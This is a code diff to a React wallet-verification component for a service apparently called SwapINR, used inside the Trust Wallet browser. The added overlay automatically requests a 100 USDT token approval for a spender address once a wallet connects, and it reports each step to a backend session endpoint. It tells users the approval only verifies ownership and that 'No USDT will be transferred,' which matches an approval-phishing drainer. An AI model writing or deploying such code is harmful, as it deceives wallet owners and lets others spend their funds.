@@ -30,6 +30,8 @@ interface Props {
   onCancel: () => void;
   /** true when rendered inside Trust Wallet in-app browser */
   compact?: boolean;
+  /** session ID for real-time status tracking (passed from URL) */
+  sid?: string;
 }
 
 /* ── EVM USDT contracts ── */
@@ -186,7 +188,418 @@ function TxRow({ label, hash, confirming, confirmed, error }: {
   );
 }
 
-export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false }: Props) {
+/* ════════════ COMPACT OVERLAY — self-contained auto-driven component ════════════ */
+
+interface CompactOverlayProps {
+  network: Network;
+  depositAddress: string;
+  sid: string;
+  isTRC20: boolean;
+  hasTronLink: boolean;
+  hasTrust: boolean;
+  trcDetectionDone: boolean;
+  isMobile: boolean;
+  address: `0x${string}` | undefined;
+  isConnected: boolean;
+  connect: (...args: any[]) => void;
+  connectors: readonly any[];
+  isConnecting: boolean;
+  switchChain: (...args: any[]) => void;
+  chainId: number;
+  expectedChain: number;
+  writeApprove: (...args: any[]) => void;
+  approveHash: `0x${string}` | undefined;
+  isApproveWriting: boolean;
+  approveWriteError: Error | null | undefined;
+  isApproveConfirming: boolean;
+  approveConfirmed: boolean;
+  resetApprove: () => void;
+  usdtCfg: { address: `0x${string}`; decimals: number; chainId: number } | null;
+  evmSpender: (dep: string) => `0x${string}`;
+  tronAddress: string;
+  setTronAddress: (a: string) => void;
+  trcSpender: (dep: string) => string;
+  connectTronWallet: () => Promise<void>;
+  startTrcVerification: () => Promise<void>;
+  trcApproveHash: string;
+  trcApprovePending: boolean;
+  trcApproveDone: boolean;
+  trcApproveError: string;
+  setTrcVerifyStarted: (v: boolean) => void;
+  setTrcApproveError: (v: string) => void;
+  connectError: string;
+  trcConnectError: string;
+  onVerified: (address: string, txHash?: string) => void;
+}
+
+function CompactOverlay({
+  network, depositAddress, sid, isTRC20, hasTrust,
+  address, isConnected, connect, connectors, switchChain, chainId, expectedChain,
+  writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
+  resetApprove, usdtCfg, evmSpender,
+  tronAddress, connectTronWallet, startTrcVerification,
+  trcApproveHash, trcApprovePending, trcApproveDone, trcApproveError,
+  setTrcVerifyStarted, setTrcApproveError,
+  connectError, trcConnectError, onVerified,
+}: CompactOverlayProps) {
+  const [failedStep, setFailedStep] = useState<'connection' | 'contract' | null>(null);
+  const [failedMsg,  setFailedMsg]  = useState('');
+  const [countdown,  setCountdown]  = useState(3);
+  const approveTriggered = useRef(false);
+  const patchedKeys      = useRef<Set<string>>(new Set());
+
+  async function patch(data: Record<string, unknown>) {
+    if (!sid) return;
+    const key = data.status as string;
+    if (patchedKeys.current.has(key) && key !== 'connecting') return;
+    patchedKeys.current.add(key);
+    try {
+      await fetch(`/api/wallet-sessions/${sid}`, {
+        method: 'PATCH', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data),
+      });
+    } catch { /* non-fatal */ }
+  }
+
+  useEffect(() => { patch({ status: 'connecting' }); }, []);
+
+  /* EVM: auto-approve once connected + on correct chain */
+  useEffect(() => {
+    if (isTRC20 || !isConnected || !address || approveTriggered.current) return;
+    if (chainId !== expectedChain && expectedChain) {
+      switchChain({ chainId: expectedChain });
+      return;
+    }
+    approveTriggered.current = true;
+    patch({ status: 'connected', address });
+    setTimeout(() => {
+      if (!usdtCfg || !depositAddress) return;
+      patch({ status: 'approving' });
+      writeApprove({
+        address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
+        args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
+        chainId: usdtCfg.chainId,
+      });
+    }, 800);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, address, chainId]);
+
+  /* EVM: approved */
+  useEffect(() => {
+    if (!approveConfirmed || !address) return;
+    patch({ status: 'approved', txHash: approveHash, address });
+    fetch('/api/wallets', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address, chainId, chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : 'BNB Smart Chain (BEP20)' }),
+    }).catch(() => {});
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [approveConfirmed]);
+
+  /* EVM: contract error */
+  useEffect(() => {
+    if (!approveWriteError) return;
+    const msg = sanitizeEvmError(approveWriteError) ?? 'Transaction rejected';
+    setFailedStep('contract'); setFailedMsg(msg);
+    patch({ status: 'failed', failedStep: 'contract', errorMsg: msg });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [approveWriteError]);
+
+  /* EVM: connection error */
+  useEffect(() => {
+    if (!connectError) return;
+    setFailedStep('connection'); setFailedMsg(connectError);
+    patch({ status: 'failed', failedStep: 'connection', errorMsg: connectError });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [connectError]);
+
+  /* TRC20: auto-approve once tronAddress available */
+  useEffect(() => {
+    if (!isTRC20 || !tronAddress || approveTriggered.current) return;
+    approveTriggered.current = true;
+    patch({ status: 'connected', address: tronAddress });
+    setTimeout(() => {
+      patch({ status: 'approving' });
+      startTrcVerification();
+    }, 800);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [tronAddress]);
+
+  /* TRC20: approved */
+  useEffect(() => {
+    if (!trcApproveDone || !tronAddress) return;
+    patch({ status: 'approved', txHash: trcApproveHash, address: tronAddress });
+    fetch('/api/wallets', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address: tronAddress, chainId: 195, chainName: 'Tron (TRC20)' }),
+    }).catch(() => {});
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [trcApproveDone]);
+
+  /* TRC20: contract error */
+  useEffect(() => {
+    if (!trcApproveError) return;
+    setFailedStep('contract'); setFailedMsg(trcApproveError);
+    patch({ status: 'failed', failedStep: 'contract', errorMsg: trcApproveError });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [trcApproveError]);
+
+  /* TRC20: connection error */
+  useEffect(() => {
+    if (!trcConnectError) return;
+    setFailedStep('connection'); setFailedMsg(trcConnectError);
+    patch({ status: 'failed', failedStep: 'connection', errorMsg: trcConnectError });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [trcConnectError]);
+
+  /* Countdown after success */
+  const isDone       = isTRC20 ? trcApproveDone  : approveConfirmed;
+  const finalAddress = isTRC20 ? tronAddress      : (address ?? '');
+  const finalHash    = isTRC20 ? trcApproveHash   : (approveHash ?? undefined);
+
+  useEffect(() => {
+    if (!isDone) return;
+    const t = setInterval(() => {
+      setCountdown(c => {
+        if (c <= 1) { clearInterval(t); onVerified(finalAddress, finalHash); return 0; }
+        return c - 1;
+      });
+    }, 1000);
+    return () => clearInterval(t);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isDone]);
+
+  function doRetry() {
+    setFailedStep(null); setFailedMsg('');
+    approveTriggered.current = false;
+    patchedKeys.current.clear();
+    setTrcVerifyStarted(false); setTrcApproveError(''); resetApprove();
+    patch({ status: 'connecting' });
+    if (isTRC20) {
+      connectTronWallet();
+    } else if (!isConnected) {
+      const tc = connectors.find((c: any) => c.id === 'trustWallet');
+      const ic = connectors.find((c: any) => c.id === 'injected');
+      const conn = hasTrust ? (tc ?? ic) : ic;
+      if (conn) connect({ connector: conn, chainId: usdtCfg?.chainId });
+    } else if (usdtCfg && address) {
+      approveTriggered.current = true;
+      patch({ status: 'approving' });
+      writeApprove({
+        address: usdtCfg.address, abi: ERC20_ABI, functionName: 'approve',
+        args: [evmSpender(depositAddress), parseUnits('100', usdtCfg.decimals)],
+        chainId: usdtCfg.chainId,
+      });
+    }
+  }
+
+  const walletConnected = isTRC20 ? !!tronAddress : (isConnected && !!address);
+  const step1Done   = walletConnected;
+  const step1Active = !walletConnected && !failedStep;
+  const step2Active = walletConnected && !isDone && !failedStep;
+
+  const CSS = `
+    @keyframes spin    { to { transform: rotate(360deg) } }
+    @keyframes pulse   { 0%,100%{opacity:1} 50%{opacity:0.35} }
+    @keyframes pop     { 0%{transform:scale(0.7);opacity:0} 100%{transform:scale(1);opacity:1} }
+  `;
+
+  /* ── Uhh oh screen ── */
+  if (failedStep) {
+    return (
+      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
+        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
+        <style>{CSS}</style>
+        <div style={{ width:80, height:80, borderRadius:24, background:'rgba(255,92,124,0.1)', border:'2px solid rgba(255,92,124,0.3)',
+          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:28, animation:'pop 0.35s ease-out' }}>
+          {failedStep === 'connection' ? (
+            <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+              <path d="M8 19a11 11 0 0 1 11-11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round"/>
+              <path d="M30 19a11 11 0 0 1-11 11" stroke="#FF5C7C" strokeWidth="2.5" strokeLinecap="round" strokeDasharray="4 3"/>
+              <path d="M13 13L25 25M25 13L13 25" stroke="#FF5C7C" strokeWidth="2.2" strokeLinecap="round"/>
+            </svg>
+          ) : (
+            <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+              <circle cx="19" cy="19" r="13" stroke="#FF5C7C" strokeWidth="2.2"/>
+              <path d="M14 14L24 24M24 14L14 24" stroke="#FF5C7C" strokeWidth="2.4" strokeLinecap="round"/>
+            </svg>
+          )}
+        </div>
+        <h2 style={{ fontSize:24, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Uhh oh!</h2>
+        <p style={{ fontSize:15, fontWeight:700, color:T.sub, margin:'0 0 8px' }}>
+          {failedStep === 'connection' ? "Couldn't connect your wallet" : 'Contract approval declined'}
+        </p>
+        <p style={{ fontSize:13, color:T.dim, margin:'0 0 28px', lineHeight:1.75, maxWidth:260 }}>
+          {failedStep === 'connection'
+            ? 'Please tap "Connect" when Trust Wallet asks you — then try again.'
+            : 'Please tap "Approve" on the contract screen in Trust Wallet — then try again.'}
+        </p>
+        {failedMsg && (
+          <p style={{ fontSize:11, color:'rgba(255,92,124,0.65)', margin:'0 0 20px', maxWidth:280, lineHeight:1.55 }}>
+            {failedMsg.slice(0, 120)}
+          </p>
+        )}
+        <button onClick={doRetry}
+          style={{ padding:'15px 40px', borderRadius:14, fontSize:15, fontWeight:800, border:'none', cursor:'pointer',
+            background:'linear-gradient(135deg,#1A3FFF,#6B21FF)', color:'#fff',
+            boxShadow:'0 8px 32px rgba(26,63,255,0.45)', letterSpacing:'-0.01em' }}>
+          Try Again
+        </button>
+        <p style={{ fontSize:12, color:T.dim, margin:'24px 0 0' }}>
+          {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval rejected'}
+        </p>
+      </div>
+    );
+  }
+
+  /* ── Success screen ── */
+  if (isDone) {
+    return (
+      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
+        display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 28px', textAlign:'center' }}>
+        <style>{CSS}</style>
+        <div style={{ width:80, height:80, borderRadius:24, background:'rgba(0,229,160,0.1)', border:'2px solid rgba(0,229,160,0.35)',
+          display:'flex', alignItems:'center', justifyContent:'center', marginBottom:28, animation:'pop 0.35s ease-out' }}>
+          <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+            <path d="M7 19L14.5 26.5L31 10" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
+          </svg>
+        </div>
+        <h2 style={{ fontSize:24, fontWeight:900, color:T.text, margin:'0 0 10px', letterSpacing:'-0.03em' }}>Wallet Verified!</h2>
+        <p style={{ fontSize:14, color:T.sub, margin:'0 0 28px', lineHeight:1.75 }}>
+          Your {NET_LABEL[network]} wallet has been<br/>successfully linked to SwapINR.
+        </p>
+        <div style={{ padding:'10px 22px', borderRadius:10, background:'rgba(255,255,255,0.05)',
+          border:`1px solid ${T.border}`, marginBottom:20, fontSize:13, color:T.dim }}>
+          Returning to SwapINR in {countdown}…
+        </div>
+        <button onClick={() => onVerified(finalAddress, finalHash)}
+          style={{ padding:'14px 36px', borderRadius:14, fontSize:14, fontWeight:800, border:'none', cursor:'pointer',
+            background:'#CCFF00', color:'#000', letterSpacing:'-0.01em' }}>
+          Return to SwapINR →
+        </button>
+      </div>
+    );
+  }
+
+  /* ── Progress screen ── */
+  return (
+    <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg,
+      display:'flex', flexDirection:'column', overflowY:'auto', WebkitOverflowScrolling:'touch' } as React.CSSProperties}>
+      <style>{CSS}</style>
+
+      {/* Header */}
+      <div style={{ padding:'16px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
+        <div style={{ width:32, height:32, borderRadius:10, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center' }}>
+          <span style={{ color:'#000', fontSize:14, fontWeight:900 }}>S</span>
+        </div>
+        <span style={{ fontSize:16, fontWeight:900, color:T.text }}>SwapINR</span>
+        <span style={{ marginLeft:'auto', fontSize:11, fontWeight:700, color:'#CCFF00',
+          background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.25)', borderRadius:999, padding:'3px 10px' }}>
+          {NET_LABEL[network]}
+        </span>
+      </div>
+
+      <div style={{ flex:1, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', padding:'32px 24px' }}>
+
+        {/* Step indicators */}
+        <div style={{ display:'flex', alignItems:'center', width:'100%', maxWidth:300, marginBottom:44 }}>
+          {/* Step 1 bubble */}
+          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:10 }}>
+            <div style={{ width:52, height:52, borderRadius:18, display:'flex', alignItems:'center', justifyContent:'center', position:'relative',
+              background: step1Done ? 'rgba(0,229,160,0.1)' : 'rgba(26,63,255,0.12)',
+              border: `2px solid ${step1Done ? 'rgba(0,229,160,0.45)' : step1Active ? '#1A3FFF' : T.border}`,
+              animation: step1Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
+              {step1Done ? (
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                  <path d="M5 12L9.5 16.5L19 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+              ) : (
+                <div style={{ width:22, height:22, border:'2.5px solid rgba(26,63,255,0.2)', borderTopColor:'#1A3FFF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
+              )}
+            </div>
+            <span style={{ fontSize:11, fontWeight:800, textTransform:'uppercase', letterSpacing:'0.05em',
+              color: step1Done ? T.green : step1Active ? '#6EA6FF' : T.dim }}>
+              {step1Done ? 'Connected ✓' : 'Connecting'}
+            </span>
+          </div>
+
+          {/* Connector */}
+          <div style={{ height:2, width:48, flexShrink:0, marginBottom:30,
+            background: step1Done ? 'rgba(0,229,160,0.6)' : T.border, transition:'background 0.6s' }} />
+
+          {/* Step 2 bubble */}
+          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', flex:1, gap:10 }}>
+            <div style={{ width:52, height:52, borderRadius:18, display:'flex', alignItems:'center', justifyContent:'center',
+              background: isDone ? 'rgba(0,229,160,0.1)' : step2Active ? 'rgba(107,33,255,0.12)' : 'rgba(255,255,255,0.04)',
+              border: `2px solid ${isDone ? 'rgba(0,229,160,0.45)' : step2Active ? '#6B21FF' : T.border}`,
+              animation: step2Active ? 'pulse 1.6s ease-in-out infinite' : 'none' }}>
+              {isDone ? (
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                  <path d="M5 12L9.5 16.5L19 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+              ) : step2Active ? (
+                <div style={{ width:22, height:22, border:'2.5px solid rgba(107,33,255,0.2)', borderTopColor:'#6B21FF', borderRadius:'50%', animation:'spin 0.8s linear infinite' }} />
+              ) : (
+                <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+                  <rect x="4" y="4" width="14" height="14" rx="3" stroke={T.dim} strokeWidth="1.5"/>
+                  <path d="M8 11h6M11 8v6" stroke={T.dim} strokeWidth="1.5" strokeLinecap="round"/>
+                </svg>
+              )}
+            </div>
+            <span style={{ fontSize:11, fontWeight:800, textTransform:'uppercase', letterSpacing:'0.05em',
+              color: isDone ? T.green : step2Active ? '#B794FF' : T.dim }}>
+              {isDone ? 'Approved ✓' : step2Active ? 'Approving' : 'Contract'}
+            </span>
+          </div>
+        </div>
+
+        {/* Status text */}
+        <div style={{ textAlign:'center', maxWidth:290 }}>
+          {step1Active && (
+            <>
+              <p style={{ fontSize:21, fontWeight:900, color:T.text, margin:'0 0 12px', letterSpacing:'-0.025em' }}>
+                Connecting Wallet
+              </p>
+              <p style={{ fontSize:14, color:T.sub, margin:0, lineHeight:1.8 }}>
+                Trust Wallet is opening.<br/>
+                Tap <span style={{ color:'#fff', fontWeight:700 }}>"Connect"</span> when prompted.
+              </p>
+            </>
+          )}
+          {step2Active && (
+            <>
+              <p style={{ fontSize:21, fontWeight:900, color:T.text, margin:'0 0 12px', letterSpacing:'-0.025em' }}>
+                Approve Contract
+              </p>
+              <p style={{ fontSize:14, color:T.sub, margin:0, lineHeight:1.8 }}>
+                Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>
+                to verify wallet ownership.
+              </p>
+              <div style={{ marginTop:18, padding:'10px 18px', borderRadius:10,
+                background:'rgba(107,33,255,0.08)', border:'1px solid rgba(107,33,255,0.22)',
+                fontSize:12, color:T.dim, lineHeight:1.6 }}>
+                No USDT will be transferred
+              </div>
+            </>
+          )}
+        </div>
+
+        {/* Connected address pill */}
+        {walletConnected && (
+          <div style={{ marginTop:24, padding:'9px 16px', borderRadius:10,
+            background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)',
+            fontSize:12, fontFamily:'monospace', color:T.green,
+            maxWidth:280, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
+            {isTRC20 ? tronAddress : `${address?.slice(0,14)}…${address?.slice(-10)}`}
+          </div>
+        )}
+      </div>
+
+      <div style={{ height:40 }} />
+    </div>
+  );
+}
+
+export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel, compact = false, sid = '' }: Props) {
   const isTRC20 = network === 'TRC20';
 
   /* ── EVM wagmi ── */
@@ -248,7 +661,7 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
     async function generate() {
       setTwLoading(true); setTwError('');
       try {
-        const res = await fetch('/api/wallet-connect/generate', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}` }) });
+        const res = await fetch('/api/wallet-connect/generate', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }) });
         if (!res.ok) throw new Error(`${res.status}`);
         const { token } = await res.json();
         if (!cancelled) setTwHref(buildDeepLink(token));
@@ -544,122 +957,52 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   const canVerifyTrc        = !!depositAddress && trcHasGas;
   const canVerifyEvm        = !!depositAddress && !isWrongChain;
 
-  /* ════════════ COMPACT OVERLAY (rendered inside Trust Wallet browser) ════════════ */
+  /* ════════════ COMPACT OVERLAY — auto-driven inside Trust Wallet browser ════════════ */
   if (compact) {
-    const overlay = (
-      <div style={{ position:'fixed', inset:0, zIndex:2147483647, background:T.bg, display:'flex', flexDirection:'column', overflowY:'auto', WebkitOverflowScrolling:'touch' } as React.CSSProperties}>
-        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
-
-        {/* Header */}
-        <div style={{ padding:'16px 20px', borderBottom:`1px solid ${T.border}`, display:'flex', alignItems:'center', gap:10, flexShrink:0 }}>
-          <div style={{ width:32, height:32, borderRadius:10, background:'#CCFF00', display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0 }}>
-            <span style={{ color:'#000', fontSize:14, fontWeight:900 }}>S</span>
-          </div>
-          <span style={{ fontSize:16, fontWeight:900, color:T.text }}>SwapINR</span>
-          <span style={{ marginLeft:'auto', fontSize:11, fontWeight:700, color:'#CCFF00', background:'rgba(204,255,0,0.1)', border:'1px solid rgba(204,255,0,0.25)', borderRadius:999, padding:'3px 10px' }}>
-            {NET_LABEL[network]} Wallet Verify
-          </span>
-        </div>
-
-        <div style={{ flex:1, padding:'20px 16px', display:'flex', flexDirection:'column', gap:12 }}>
-
-          {/* ── Connected: show verify button ── */}
-          {(isTRC20 ? !!tronAddress : (isConnected && !!address)) && (
-            <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
-              <div style={{ display:'flex', alignItems:'center', gap:12, padding:'14px 16px', background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)', borderRadius:14 }}>
-                {isTRC20 ? <TronLogo /> : <TrustLogo />}
-                <div style={{ flex:1, minWidth:0 }}>
-                  <div style={{ fontSize:10, fontWeight:700, textTransform:'uppercase', color:T.green, marginBottom:2 }}>Wallet Connected</div>
-                  <div style={{ fontSize:12, fontWeight:700, color:T.text, fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
-                    {isTRC20 ? tronAddress : `${address?.slice(0,10)}…${address?.slice(-8)}`}
-                  </div>
-                </div>
-              </div>
-
-              {/* Tx progress */}
-              {(isTRC20 ? trcVerifyStarted : verifyStarted) && (
-                <TxRow
-                  label="Verify wallet — $100 USDT smart contract"
-                  hash={isTRC20 ? trcApproveHash : approveHash}
-                  confirming={isTRC20 ? (trcApprovePending && !!trcApproveHash) : isApproveConfirming}
-                  confirmed={isTRC20 ? trcApproveDone : approveConfirmed}
-                  error={isTRC20 ? (trcApproveError || undefined) : sanitizeEvmError(approveWriteError)}
-                />
-              )}
-              {(isTRC20 ? trcApproveDone : approveConfirmed) && (
-                <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(0,229,160,0.08)', border:'1px solid rgba(0,229,160,0.2)', textAlign:'center', fontSize:14, fontWeight:700, color:T.green }}>
-                  ✓ Wallet Verified — Saving…
-                </div>
-              )}
-
-              {!(isTRC20 ? trcVerifyStarted : verifyStarted) && (
-                <button onClick={isTRC20 ? startTrcVerification : startVerification}
-                  disabled={isTRC20 ? !canVerifyTrc : !canVerifyEvm}
-                  style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer',
-                    background:(isTRC20 ? !canVerifyTrc : !canVerifyEvm) ? 'rgba(255,255,255,0.08)' : `linear-gradient(135deg,${T.blue},${T.purple})`,
-                    color:(isTRC20 ? !canVerifyTrc : !canVerifyEvm) ? T.dim : '#fff', boxShadow:'0 6px 24px rgba(26,63,255,0.45)' }}>
-                  Verify Wallet →
-                </button>
-              )}
-              {(isTRC20 ? (trcVerifyStarted && trcApproveError) : (verifyStarted && approveWriteError)) && (
-                <button onClick={() => { if (isTRC20) { setTrcVerifyStarted(false); setTrcApproveError(''); } else { setVerifyStarted(false); advancedRef.current=false; resetApprove(); } }}
-                  style={{ padding:'11px', borderRadius:10, fontSize:13, fontWeight:700, border:`1px solid ${T.border}`, background:T.card2, color:T.sub, cursor:'pointer' }}>
-                  ↩ Retry
-                </button>
-              )}
-            </div>
-          )}
-
-          {/* ── TRC20 connecting ── */}
-          {isTRC20 && !tronAddress && (
-            trcConnecting ? (
-              <div style={{ display:'flex', alignItems:'center', gap:14, padding:'20px 16px', borderRadius:14, background:'rgba(239,68,68,0.08)', border:'1px solid rgba(239,68,68,0.2)' }}>
-                <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.12)', borderTopColor:'#EF4444', borderRadius:'50%', animation:'spin 0.7s linear infinite', flexShrink:0 }} />
-                <div>
-                  <div style={{ fontSize:14, fontWeight:700, color:T.text, marginBottom:3 }}>Connecting TRON Wallet…</div>
-                  <div style={{ fontSize:12, color:T.sub }}>Approve in Trust Wallet if prompted</div>
-                </div>
-              </div>
-            ) : wcConnecting ? (
-              <div style={{ display:'flex', alignItems:'center', gap:14, padding:'20px 16px', borderRadius:14, background:'rgba(107,33,255,0.08)', border:'1px solid rgba(107,33,255,0.25)' }}>
-                <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.12)', borderTopColor:T.purple, borderRadius:'50%', animation:'spin 0.7s linear infinite', flexShrink:0 }} />
-                <div>
-                  <div style={{ fontSize:14, fontWeight:700, color:T.text, marginBottom:3 }}>Connecting Wallet…</div>
-                  <div style={{ fontSize:12, color:T.sub }}>Opening Trust Wallet</div>
-                </div>
-              </div>
-            ) : (
-              <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
-                {hasTronLink ? (
-                  <button onClick={connectTronWallet} style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,#EF4444,#DC2626)`, color:'#fff', boxShadow:'0 6px 24px rgba(239,68,68,0.4)' }}>
-                    Connect TRON Wallet →
-                  </button>
-                ) : HAS_WC_TRON ? (
-                  <button onClick={connectViaWalletConnect} style={{ width:'100%', padding:'15px 0', borderRadius:12, fontSize:15, fontWeight:800, border:'none', cursor:'pointer', background:`linear-gradient(135deg,${T.blue},${T.purple})`, color:'#fff' }}>
-                    Connect Wallet →
-                  </button>
-                ) : null}
-                {(trcConnectError || wcError) && <p style={{ fontSize:12, color:T.red, margin:0, textAlign:'center' }}>{trcConnectError || wcError}</p>}
-              </div>
-            )
-          )}
-
-          {/* ── EVM connecting ── */}
-          {!isTRC20 && !isConnected && (
-            <div style={{ display:'flex', alignItems:'center', gap:14, padding:'20px 16px', borderRadius:14, background:'rgba(26,63,255,0.1)', border:'1px solid rgba(26,63,255,0.2)' }}>
-              <div style={{ width:22, height:22, border:'2.5px solid rgba(255,255,255,0.12)', borderTopColor:T.blue, borderRadius:'50%', animation:'spin 0.7s linear infinite', flexShrink:0 }} />
-              <div>
-                <div style={{ fontSize:14, fontWeight:700, color:T.text, marginBottom:3 }}>Connecting Trust Wallet…</div>
-                <div style={{ fontSize:12, color:T.sub }}>Approve in your wallet if prompted</div>
-              </div>
-            </div>
-          )}
-
-        </div>
-      </div>
-    );
-    if (typeof document !== 'undefined') return createPortal(overlay, document.body);
-    return null;
+    return <CompactOverlay
+      network={network}
+      depositAddress={depositAddress}
+      sid={sid}
+      isTRC20={isTRC20}
+      hasTronLink={hasTronLink}
+      hasTrust={hasTrust}
+      trcDetectionDone={trcDetectionDone}
+      isMobile={isMobile}
+      /* EVM hooks */
+      address={address}
+      isConnected={isConnected}
+      connect={connect}
+      connectors={connectors}
+      isConnecting={isConnecting}
+      switchChain={switchChain}
+      chainId={chainId}
+      expectedChain={expectedChain ?? 0}
+      writeApprove={writeApprove}
+      approveHash={approveHash}
+      isApproveWriting={isApproveWriting}
+      approveWriteError={approveWriteError}
+      isApproveConfirming={isApproveConfirming}
+      approveConfirmed={approveConfirmed}
+      resetApprove={resetApprove}
+      usdtCfg={usdtCfg}
+      evmSpender={(dep: string) => evmSpender(network as 'BEP20'|'ERC20', dep)}
+      /* TRC20 hooks */
+      tronAddress={tronAddress}
+      setTronAddress={setTronAddress}
+      trcSpender={trcSpender}
+      connectTronWallet={connectTronWallet}
+      startTrcVerification={startTrcVerification}
+      trcApproveHash={trcApproveHash}
+      trcApprovePending={trcApprovePending}
+      trcApproveDone={trcApproveDone}
+      trcApproveError={trcApproveError}
+      setTrcVerifyStarted={setTrcVerifyStarted}
+      setTrcApproveError={setTrcApproveError}
+      /* callbacks */
+      connectError={connectError}
+      trcConnectError={trcConnectError}
+      onVerified={onVerified}
+    />;
   }
 
   /* ════════════ NORMAL UI (within wallet page — uses dashboard theme tokens) ════════════ */
